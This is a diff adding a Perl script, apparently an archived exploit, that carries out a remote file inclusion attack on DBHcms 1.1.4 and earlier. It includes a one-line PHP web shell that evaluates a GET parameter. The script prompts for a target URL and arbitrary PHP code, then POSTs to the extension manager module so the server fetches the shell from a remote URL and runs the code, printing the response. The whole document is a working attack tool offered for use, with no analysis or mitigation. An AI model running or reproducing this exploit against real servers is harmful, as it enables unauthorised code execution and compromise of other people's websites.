@@ -1,0 +1,61 @@
+#!/usr/bin/perl
+#	DBHcms <= 1.1.4 Remote File Inclusion exploit
+#	Vendor url: www.drbenhur.com
+#
+# exploit is hard to execute through a browser -possible though- since it's with POST
+#							~Iron
+#							http://www.randombase.com
+require LWP::UserAgent;
+#Shell:
+# <?php if(!empty($_GET['do'])){eval($_GET['do']);}?>
+$shell_url = "http://localhost/s.txt";
+
+print "#
+#  DBHcms <= 1.1.4 Remote File Inclusion exploit
+# By Iron - randombase.com
+# Greets to everyone at RootShell Security Group
+#
+# Example target url: http://www.target.com/dhbcms/
+Target url?";
+chomp($target=<stdin>);
+if($target !~ /^http:\/\//)
+{
+	$target = "http://".$target;
+}
+if($target !~ /\/$/)
+{
+	$target .= "/";
+}
+print "PHP code to evaluate? ";
+chomp($code=<stdin>);
+$code =~ s/(<\?php|\?>|<\?)//ig;
+$target .= "dbhcms/mod/mod.extmanager.php?do=".$code;
+
+$ua = LWP::UserAgent->new;
+$ua->timeout(10);
+$ua->env_proxy;
+
+$response = $ua->post($target,
+{
+'extmanager_install' => $shell_url.'?'
+});
+
+if ($response->is_success)
+{
+	print "\n"."#" x 20 ."\n";
+	if($response->content =~ /URL file-access/)
+	{
+		print 'Exploit failed';
+	}
+	else
+	{
+		print $response->content;
+	}
+	print "\n"."#" x 20 ."\n";
+}
+else
+{
+ die "Error: ".$response->status_line;
+}
+
+# milw0rm.com [2008-02-25]
